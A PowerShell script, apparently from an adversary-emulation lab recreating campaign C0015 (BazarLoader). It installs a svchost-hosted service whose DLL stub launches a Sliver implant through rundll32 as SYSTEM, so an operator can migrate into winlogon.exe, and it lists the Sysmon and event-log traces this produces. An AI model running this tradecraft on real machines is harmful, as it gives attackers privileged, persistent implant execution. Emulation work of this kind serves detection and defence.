<#
.SYNOPSIS
    Install / remove the C0015 stage service (route A): svchost -k c0015grp -> rundll32 D8B3.dll.

.DESCRIPTION
    Reproduces the C0015 process-tree edge `svchost.exe -> rundll32.exe (D8b3.dll)` with a SYSTEM
    token, which is the prerequisite for `migrate --process-name winlogon.exe`.

    This is [LAB-MECHANISM]: the source report records that BazarLoader "invokes a Svchost.exe"
    but not how. The service artifacts (7045/4697, Services\c0015svc) are lab noise and are
    recorded as such in the run ledger.

    Run elevated on WS01. The service is `demand` start, so nothing runs until -Start.

.PARAMETER DllPath
    Path to the built stub (c0015_svc_stub.c -> c0015_stage.dll).

.PARAMETER SpawnCmd
    Command line the stub spawns from inside svchost (the Sliver DLL host).

.PARAMETER IniPath
    config.ini read by the stub ([stage] spawn_cmd / marker_name).

.EXAMPLE
    .\install_stage_service.ps1 -DllPath .\c0015_stage.dll -SpawnCmd "C:\Windows\System32\rundll32.exe C:\Users\Public\C0015\D8B3.dll" -Start

.EXAMPLE
    .\install_stage_service.ps1 -Uninstall
#>
[CmdletBinding()]
param(
    [string]$DllPath     = 'C:\Users\Public\C0015\c0015_stage.dll',
    [string]$SpawnCmd    = 'C:\Windows\System32\rundll32.exe C:\Users\Public\C0015\D8B3.dll',
    [string]$IniPath     = 'C:\Users\Public\C0015\config.ini',
    [string]$ServiceName = 'c0015svc',
    [string]$GroupName   = 'c0015grp',
    [string]$MarkerName  = 'svc-stage.txt',
    [switch]$Uninstall,
    [switch]$Start
)

$ErrorActionPreference = 'Stop'
$PSNativeCommandUseErrorActionPreference = $false
$svchost = Join-Path $env:SystemRoot 'System32\svchost.exe'
$svcKey  = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
$grpKey  = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost'

function Assert-Admin {
    $me = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    if (-not $me.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        throw 'Run this script from an elevated PowerShell (the service must be created as admin).'
    }
}

function Set-IniStageValue {
    param([string]$Path, [string]$Key, [string]$Value)

    $dir = Split-Path -Parent $Path
    if ($dir -and -not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }
    $lines = @()
    if (Test-Path -LiteralPath $Path) {
        $lines = @(Get-Content -LiteralPath $Path)
    }

    # drop the key anywhere, then rewrite it inside [stage]
    $lines = @($lines | Where-Object { $_ -notmatch "^\s*$([regex]::Escape($Key))\s*=" })
    if (-not ($lines | Where-Object { $_ -match '^\s*\[stage\]\s*$' })) {
        $lines += '[stage]'
    }
    $out = New-Object System.Collections.Generic.List[string]
    $inStage = $false
    $inserted = $false
    foreach ($ln in $lines) {
        if ($ln -match '^\s*\[(.+)\]\s*$') {
            if ($inStage -and -not $inserted) {
                $out.Add("$Key=$Value")
                $inserted = $true
            }
            $inStage = ($Matches[1].Trim() -eq 'stage')
        }
        $out.Add($ln)
    }
    if ($inStage -and -not $inserted) {
        $out.Add("$Key=$Value")
        $inserted = $true
    }
    if (-not $inserted) {
        $out.Add('[stage]')
        $out.Add("$Key=$Value")
    }
    Set-Content -LiteralPath $Path -Value $out -Encoding ASCII
}

function Invoke-Sc {
    param([string[]]$ScArgs)
    & sc.exe @ScArgs
    if ($LASTEXITCODE -ne 0) {
        throw "sc.exe $($ScArgs -join ' ') failed with exit code $LASTEXITCODE"
    }
}

Assert-Admin

if ($Uninstall) {
    Write-Host "[*] Stopping/removing $ServiceName"
    & sc.exe stop $ServiceName | Out-Null
    Start-Sleep -Seconds 2
    & sc.exe delete $ServiceName | Out-Null
    if (Test-Path $svcKey) {
        Remove-Item -LiteralPath $svcKey -Recurse -Force -ErrorAction SilentlyContinue
    }
    $grp = (Get-ItemProperty -Path $grpKey -Name $GroupName -ErrorAction SilentlyContinue).$GroupName
    if ($grp -contains $ServiceName) {
        $rest = @($grp) | Where-Object { $_ -ne $ServiceName }
        if ($rest.Count -gt 0) {
            New-ItemProperty -Path $grpKey -Name $GroupName -Value $rest `
                -PropertyType MultiString -Force | Out-Null
        } else {
            Remove-ItemProperty -Path $grpKey -Name $GroupName -ErrorAction SilentlyContinue
        }
    }
    Write-Host '[+] Removed. Process tree edge svchost -> rundll32 will no longer be produced.'
    return
}

if (-not (Test-Path -LiteralPath $DllPath)) {
    throw "Stub DLL not found: $DllPath (build payloads/dll/c0015_svc_stub.c first)."
}

# --- config -----------------------------------------------------------------
Set-IniStageValue -Path $IniPath -Key 'spawn_cmd'   -Value $SpawnCmd
Set-IniStageValue -Path $IniPath -Key 'marker_name' -Value $MarkerName
Write-Host "[+] $IniPath updated ([stage] spawn_cmd / marker_name)"

# --- service ----------------------------------------------------------------
if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) {
    Write-Host "[*] $ServiceName already exists - recreating"
    & sc.exe stop $ServiceName | Out-Null
    Start-Sleep -Seconds 2
    & sc.exe delete $ServiceName | Out-Null
    Start-Sleep -Seconds 1
}

New-Service -Name $ServiceName -BinaryPathName "`"$svchost -k $GroupName`"" `
    -DisplayName 'C0015 Stage Service' -StartupType Manual | Out-Null

New-Item -Path "$svcKey\Parameters" -Force | Out-Null
New-ItemProperty -Path "$svcKey\Parameters" -Name 'ServiceDll' -Value $DllPath `
    -PropertyType ExpandString -Force | Out-Null

$existing = (Get-ItemProperty -Path $grpKey -Name $GroupName -ErrorAction SilentlyContinue).$GroupName
$members = @()
if ($existing) { $members = @($existing) }
if ($members -notcontains $ServiceName) { $members += $ServiceName }
New-ItemProperty -Path $grpKey -Name $GroupName -Value $members `
    -PropertyType MultiString -Force | Out-Null

Write-Host "[+] ServiceDll = $DllPath"
Write-Host "[+] Svchost group '$GroupName' = $($members -join ',')"

if ($Start) {
    Start-Service -Name $ServiceName
    Start-Sleep -Seconds 2
}

# --- verification -----------------------------------------------------------
Write-Host ''
Write-Host '--- verify ---'
& sc.exe query $ServiceName
$svchostProc = Get-CimInstance Win32_Process -Filter "Name='svchost.exe'" |
    Where-Object { $_.CommandLine -match "-k $GroupName" }
if ($svchostProc) {
    Write-Host "[+] svchost -k $GroupName PID=$($svchostProc.ProcessId)"
    Get-CimInstance Win32_Process -Filter "ParentProcessId=$($svchostProc.ProcessId)" |
        Select-Object ProcessId, Name, CommandLine | Format-Table -AutoSize
} else {
    Write-Host "[-] no svchost -k $GroupName (start the service, then re-run verification)"
}
Write-Host ''
Write-Host 'Expected afterwards: Sysmon E1 svchost.exe -> rundll32.exe <D8B3.dll>, then'
Write-Host '  sliver> migrate --process-name winlogon.exe    (from that rundll32 session)'


